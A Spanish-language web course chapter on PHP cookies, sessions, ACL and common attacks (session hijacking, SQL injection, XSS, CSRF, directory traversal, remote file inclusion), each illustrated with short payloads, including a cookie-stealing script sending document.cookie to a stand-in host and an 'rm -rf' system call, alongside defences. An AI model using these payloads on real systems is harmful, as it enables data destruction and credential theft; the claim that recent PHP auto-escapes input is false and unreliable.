---
layout: page
title: 3 Cookies, sesiones y seguridad
permalink: /cookies-sesiones-seguridad/
nav_order: 3
has_children: false
parent: Desarrollo Web en Entorno Servidor
---
# 3. Cookies, sesiones y seguridad
{: .no_toc }

- TOC
{:toc}


## 3.1. Autenticación mediante ACL

Casi todas las aplicaciones web incluyen un subsistema de autenticación de usuarios (ACL = Access Control List).

Ese subsistema suele estar basado en este diseño de base de datos:

![Tablas ACL](/assets/images/03-acl.jpg)

Esto significa que necesitamos **cinco tablas** para implementar un ACL completo.

Sin embargo, la mayor parte de las veces tendremos suficiente con solo tres tablas (usuarios, roles y usuarios-roles), o incluso solo con una (usuarios, añadiendo quizá un campo "tipo"). Optar por una solución más o menos compleja dependerá del tipos de sistema que estemos implementando.

En cualquier caso, es conveniente que conozcas el esquema ACL completo (5 tablas) para que lo pongas en práctica cuando lo necesites.

## 3.2. Cookies

### 3.2.1. ¿Qué son las cookies?

Las cookies son pequeños archivos de texto enviados desde el servidor que se almacenan en el lado del cliente. Permiten guardar información de forma persistente, de manera que se mantenga entre una petición al servidor y otra. Una cookie puede durar minutos, horas, días o incluso indefinidamente.

PHP soporta cookies de forma transparente. Se pueden configurar Cookies usando las funciones setcookie() o setrawcookie() y el array global $_COOKIE. 

### 3.2.2. Manejando cookies con PHP

#### Enviar una cookie: setcookie()

Esta función define una cookie que se enviará al cliente junto con el resto de las cabeceras de HTTP. Devuelve *true* si la cookie se envía con éxito o *false* en caso contrario. 

Su sintaxis es:

```php
bool setcookie ( string $name [, string $value [, int $expire = 0 [, string $path [, string $domain [, bool $secure = false [, bool $httponly = false ]]]]]] )
```

Las cookies deben enviarse antes de que el script genere ninguna salida. Esto es una restricción del protocolo http. Por lo tanto, debes llamar a esta función antes de hacer *cualquier* salida, incluidos espacios en blanco. En caso contrario, la cookie no estará disponible hasta que la página se recargue.

La función setcookie() admite un montón de parámetros, la mayor parte de ellos optativos:

* **name**: El nombre de la cookie. Este es el único obligatorio. 
* **value**: El valor de la cookie.
* **expire**: El tiempo que la cookie tardará en expirar. Se trata de una fecha expresada en formato Unix.
* **path**: La ruta del servidor para la que la cookie estará disponible. Si se utiliza '/', la cookie estará disponible en la totalidad del dominio.
* **domain**: El dominio para el cual la cookie está disponible.
* **secure**: Si la cookie solo debería enviarse en caso de conexión https, pon este argument a *true*.
* **httponly**: Esta cookie solo será accesible a través de http. Es decir, no podrá utilizarse desde Javascript.

Aquí tienes tres ejemplos de envío de la misma cookie:

```php
<?php 
$value = 'I'm your father'; 

setcookie("VaderQuote", $value); 
setcookie("VaderQuote", $value, time()+3600);  // la cookie expira en una hora 
setcookie("VaderQuote", $value, time()+3600, "/quotes/", "bestquotes.com", 1); 
?>
```

#### Recuperar una cookie: $_COOKIES[]

Para ver el contenido de una cookie, simplemente hay que acceder al array global $_COOKIES. Por ejemplo: 

```php
<?php 
// Imprimir una cookie individual 
echo $_COOKIE["VaderQuote"]; 

?> 
```

#### Borrar una cookie 

Para forzar el borrado de una cookie en el cliente basta con enviarla con una fecha de expiración anterior a la fecha actual. Por ejemplo:

```php
<?php 
setcookie ("VaderQuote", "", time() - 3600);  // Establece la fecha de expiración una hora en el pasado
?>
``` 

## 3.3. Sesiones

Las sesiones en PHP habilitan un mecanismo para que un script almacene variables (llamadas **variables de sesión**) en el servidor de manera persistente, de modo que posteriores peticiones de scripts procedentes de un cliente puedan acceder a esas variables.

Cada cliente tiene su propio espacio de variables de sesión en el servidor, de manera que no se mezclan unas con otras, ni un cliente puede acceder a las variables de otro cliente.

La forma en la que PHP logra distinguir a los clientes entre sí es enviándoles una cookie con un valor aleatorio diferente para cada cliente.

En el archivo php.ini se puede configurar la manera en la que PHP almacenará las variables de sesión (en memoria, en un fichero, etc), pero esto es irrelevante de cara a su funcionamiento y compete más al administrador del sistema que al programador. Lo que a nosotros nos interesa es aprender a crear variables de sesión, asignarles valor y recuperarlo posteriormente.

### 3.3.1. Abrir sesiones: session_start()

Antes de acceder a cualquier variable de sesión (ya sea para crearla, para modificarla o para eliminarla) necesitamos indicarle a PHP que queremos usar variables de sesión en ese scrpit.

La función **session_start()** se usa para eso: habilita el acceso a las variables de sesión, es decir, crea una nueva sesión o reanuda una sesión preexistente.

Las sesiones admiten un nombre, por si necesitas crear sesiones separadas para el mismo cliente. No obstante, la mayor parte de las veces te bastará con crear sesiones sin nombre, sin necesidad de pasar ningún argumento a session_start().

### 3.3.2. Usar variables de sesión: $_SESSION

Las variables de sesión se manipulan a través del array superglobal **$_SESSION**.

Si necesitas una variable de sesión llamada, por ejemplo, nombre_usuario, simplemente haz esto:

```php
session_start();
$_SESSION['nombre_usuario'] = "lo-que-sea";
```

Por supuesto, el valor de esa posición del array $_SESSION puede consultarse o modificarse cuando lo necesitemos.

### 3.3.3. Eliminar variables de sesión: unset() y session_destroy()

La función **unset()** se utiliza para destruir cualquier variable, incluidas las de sesión:

```php
unset($_SESSION['nombre_usuario']);
```

Si lo que deseas es destruir todas las variables de sesión, es preferible recurrir a **session_destroy()**.

Ahora bien, session_destroy() destruye la información asociada a la sesión actual, pero no elimina realmente las variables de la memoria del servidor ni borra la cookie de sesión del cliente.

Para asegurarte de destruir todas las variables de sesión, puedes usar la función **session_unset()**. 

Y, para borrar la cookie de sesión, debes usar **setcookie()**, como en este ejemplo:

```php

<?php
// Retomar la sesión.
session_start();

// Destruir todas las variables de sesión (optativo)
session_unset();

// Si se desea destruir la sesión completamente, borre también la cookie de sesión.
// Nota: ¡Esto destruirá la sesión, y no la información de la sesión!
$params = session_get_cookie_params();
setcookie(session_name(), '', time() - 42000,
        $params["path"], $params["domain"],
        $params["secure"], $params["httponly"]
);

// Finalmente, cerrar la sesión
session_destroy();
?>
```

## 3.4. Sesiones, cookies y seguridad

Cookies y variables de sesión se usan a menudo para controlar la seguridad de la aplicación web.

Por ejemplo, tras el login, el ID del usuario puede almacenarse en:

* **Una cookie**. Si existe esa cookie, significa que el login ha sido correcto y la aplicación puede continuar.
* **Una variable de sesión**. Si existe determinada variable (por ejemplo, una con el id del usuario), el login ha sido correcto.

Cuando el usuario abandona la aplicación, el programa debe destruir la cookie o cerrar la sesión.

Pues bien: **ninguno de estos métodos es completamente seguro**.

Las cookies pueden rastrearse o modificarse en el ordenador del cliente. Además, algunos clientes las tienen desactivadas. ¡No te puedes fiar de ellas!

Las variables de sesión, en principio más seguras, pueden ser atacadas capturando el ID de sesión, como veremos más adelante.

El método más seguro, y el más complicado de programar, es el que combina:

* Cookies y/o variables de sesión.
* Variables guardadas en una tabla de la BD.

El uso de frameworks solventes (como los que veremos este curso) hace innecesario tomarse este trabajo, puesto que todos habilitan un mecanismo de sesiones seguras que mejora notablemente las prestaciones de las sesiones nativas de PHP.

## 3.5. Técnicas de ataque frecuentes

(Esta sección está adaptada de [securitybydefault.com](securitybydefault.com))

Uno de los fallos más graves y más frecuentes a la hora de escribir aplicaciones PHP es olvidarse de la seguridad.

Cualquier aplicación web, por el mero hecho de estar abierta a recibir información procedente de la red, es susceptible de ser atacada. Y te aseguro que, antes o después, cualquier aplicación que está online acaba por ser atacada. Es una certeza matemática.

En esta sección vamos a describir qué tipos de ataque son los más frecuentes.

Aunque proporcionaremos algunas estrategias de defensa (que debes tener en cuenta en tus desarrollos), hay una estrategia común a todos estos ataques: utilizar un framework potente como Laravel, Symfony o Zend, debidamente actualizado. Los mecanismos de seguridad que implementan estos frameworks son suficientes para la mayor parte de los casos y se mejoran cada vez que se descubre una vulnerabilidad.

### 3.5.1. Captura de ID de sesión

Como ya hemos visto, el ID de sesión se guarda como una cookie en el cliente. Por lo tanto, viaja en el paquete http desde el servidor hasta el cliente.

Un atacante que esté escuchando en esa red puede **leer el ID de sesión del paquete http** y, de ese modo, **suplantar la identidad** de la persona que inició la sesión. También puede inyectar Javascript a su víctima para capturar de ese modo el ID de sesión, con idénticos resultados.

Soluciones:

* Combinar las variables de sesión con cookies o con entradas en la base de datos.
* Cambiar el ID de sesión periódicamente.
* No confiar en variables de sesión de PHP para almacenar información muy sensible.
* Denegar el acceso a la cookie de sesión desde Javascript (usando el atributo httponly).
* Acceder solo a webs que usen https, no http. De ese modo, la cookie de sesión viaja encriptada hasta el navegador.

### 3.5.2. Inyección de SQL

Este ataque consiste en que **un usuario malintencionado ejecuta sentencias SQL contra la base de datos** del sitio web insertándolas en un formulario.

Por ejemplo, si un atacante supone que nuestra tabla de usuarios se llama *users* (una suposición muy razonable), podría inyectar SQL en el formulario de login. 

Imaginemos un formulario de login donde se introduzcan el *nick* del usuario y la contraseña. El atacante nos atacaría escribiendo algo como esto en el campo *nick*:

```
nada'; DELETE * FROM users; #
```

Imagina lo que pasaría si esta cadena se enviase sin filtrar a una variable php (por ejemplo, $nick) y se lanzase una consulta más o menos así:

```
$sql = "SELECT * FROM users WHERE nick = '$nick' and passwd = '$pass'";
```

¿Te lo ha imaginado ya? 

Lo que sucedería es que, al expandir la varible $nick en ese string, se obtendría esta concatenación de sentencias sql:

```
SELECT * FROM users WHERE nick ='nada';
DELETE * FROM users;
#'and passwd = '$pass'
```

Cuando el gestor de base de datos reciba esas sentencias, las ejecutará en orden. El primer SELECT no devolverá ningún resultado, pero es sintácticamente correcto y, en cualquier caso, al atacante no le interesan esos resultados. Luego ejecutará el DELETE y ¡bingo! El simpático atacante acaba de cepillarse nuestra tabla de usuarios.

(La tercera línea se ignorará, porque empieza por un símbolo de comentario).

El atacante no solo puede ejecutar un DELETE, sino que puede llevar a cabo otras acciones destructivas (¿qué tal un DROP DATABASE?) o instrusivas (puede intentar insertar un usuario administrador fraudulento en la tabla users). Y todo ello partiendo de una suposición bastante plausible: que la tabla de usuarios se llama *users*.

Para blindarse frente a inyecciones de SQL, se recomienda:

* **Filtrar los datos. SIEMPRE**. Por ejemplo, si tenemos en nuestro formulario un campo *username* y sabemos que los usuarios sólo pueden estar compuestos por letras y números, no se deben permitir caracteres como comillas, puntos y coma, asteriscos, etc.
* **Escapar los caracteres especiales** de cualquier dato de entrada antes de enviarla al gestor de bases de datos. Por ejemplo, mysql_real_escape_string() coloca barras invertidas antes de ciertos caracteres. addslashes() hace algo parecido. En las versiones recientes de PHP, el escape de caracteres especiales se hace automáticamente con cualquier dato que llegue por GET o POST.
* **Usar nombres poco habituales para las tablas** de la base de datos. Una estrategia frecuente es utilizar un identificador significativo (como *users* para la tabla de usuarios) y añadirle varios caracteres o números aleatorios (así, la tabla se convertiría en algo como *users_58283*). Ese sufijo aleatorio se suele almacenar en un archivo de configuración para que esté accesible para todos los scripts del programa.

### 3.5.3. XSS (cross site scripting)

El ataque por XSS consiste **ejecutar código de scripting malicioso** (básicamente, Javascript) en el contexto del sitio web.

Hay muchas formas de hacer XSS. Por ejemplo, imagínate que tenemos un portal tipo blog de noticias, y que un usuario malicioso publica, dentro del texto de una entrada, este string:

```javascript
<script>document.href = 'https://otrositio.com';</script>
```

¿Qué ocurriría? Pues que cada vez que alguien visite nuestro portal y cargue esa noticia, será redirigido a otrosition.com, donde probablemente pretenderán vendernos medicamentos de dudosa procedencia o algo por el estilo.

Otra cosa que suele hacerse con XSS es robar datos de las cookies del cliente. Para ello, el atacante solo tiene que inyectar un código como este:

```javascript
<script>document.location = 'https://otrositio.com?cookies=' + document.cookie</script>
```

Para evitar los ataques XSS, la estrategias más útil, otra vez, es **filtrar todos los datos externos**. El filtrado de datos es la práctica más importante que se puede adoptar: nunca te fíes de ningún dato que provenga de un formulario.

### 3.5.4. CSRF o XSRF (cross site request forgery)

Este tipo de ataques **explota la confianza que tiene un sitio web en la identidad de un usuario**. Es decir, se toma a un usuario válido registrado en un sitio (por ejemplo, sitio-confiable.com) y, desde otro sitio (por ejemplo, sitio-maligno.com) se le fuerza a hacer algo chungo en sitio-confiable.com.

Veámoslo con un ejemplo. Supón que eres un usuario administrador en sitio-confiable.com. Para borrar a un usuario de tu web (o cualquier otro recurso), lanzas una URL como https://sitio-confiable.com/usuario/delete/28 (donde 28 es el id del usuario).

Pues bien, imagina que has abierto una sesión como administrador en sitio-confiable.com y, sin cerrarla, navegas por otra web llamada sitio-maligno.com. Y un atacante súpermalvado, conocedor de tu propensión a navegar por sitios chungos sin cerrar la sesión en sitio-confiable.com, ha colocado este código como parte del código fuente de sitio-maligno.com:

```html
<img src='https://sitio-confiable.com/usuario/delete/28'>
```

Cuando tu navegador cargue esa página, lanzará una petición GET a sitio-confiable.com, resultando en la eliminación del usuario 28 sin que tú te enteres de cómo ha podido suceder semejante desgracia.

Esto es solo un ejemplo. Por supuesto, el atacante puede hacer un montón de cosas desagradables en sitio-confiable.com, porque ese sitio está confiando en ti, que eres un usuario legímito.

Algunas técnicas para dificultar el ataque por CSRF:

* **Utilizar POST en lugar de GET** para recibir datos.
* **Generar tokens únicos para cada petición**. Un tóken es una cadena alfanumérica aleatoria generada por el servidor cuando sirve el código HTML de un formulario. El cliente debe enviar de vuelta ese tóken junto con los datos del formulario para que el servidor acepte la petición como válida. Si un atacante intenta efectuar un ataque CSRF, enviará sus peticiones sin el tóken y serán rechazadas.

### 3.5.5. DT (directory transversal)

Este ataque se produce cuando el atacante logra **acceder a ficheros del servidor que están fuera del directorio de la aplicación** y que, teóricamente, no deberían ser accesibles desde esta.

Es fácil comprender cómo puede montarse un ataque así. Imagina un programa PHP que haga un include de este estilo:

```php
include ("views/" . $viewName);
```

Si un atacante logra manipular la variable $viewName para asignarle, por ejemplo, el valor "../../../../otro-fichero.php", nuestro programa hará un include de un fichero que está claramente fuera de los directorios de la aplicación.

Para evitar este tipo de ataques, algunas estrategias son:

* **Tener un array de páginas válidas**. Si un include trata de usar un fichero que no está en la lista, se sospechará de un ataque.
* **Buscar caracteres sospechosos en los nombres de los archivos**. Si la variable *$viewName* del ejemplo anterior incluye los caracteres "../", la cosa se pone fea. No en vano, el ataque Directory Transversal también se denomina "ataque punto punto barra".


### 3.5.6. RFI (remote file inclusion)

Este ataque se produce cuando **se incluye un archivo remoto** explotando una vulnerabilidad del código fuente.

Imagina, como antes, un programa PHP que haga un include tan común como este:

```php
include ("views/" . $viewName);
```

Imagina también que este código se invoque mediante una petición del estilo: https://sitio-confiable.com?view=main.php, algo perfectamente posible.

Pues bien, un atacante puede hacer lo siguiente: https://sitio-confiable.com?view=https://sitio-malicioso/soy-un-script-malvado.php

De ese modo, la aplicación cargará el código soy-un-script-malvado.php y lo ejecutará en el servidor sitio-confiable.com. Este código puede entonces hacer cosas terribles, como esta:

```php
<?php
  system("rm -rf");
?>
```

(No te digo lo que hace por si se te ocurre probarlo)

Para prevenir los ataques por RFI, algunas estrategias válidas son:

* **No confiar en los datos** que no provengan de nuestro sistema.
* **Validar y filtrar los datos** que introduce el usuario (sí, otra vez: validar, validar y validar cualquier cosa que provenga del usuario).


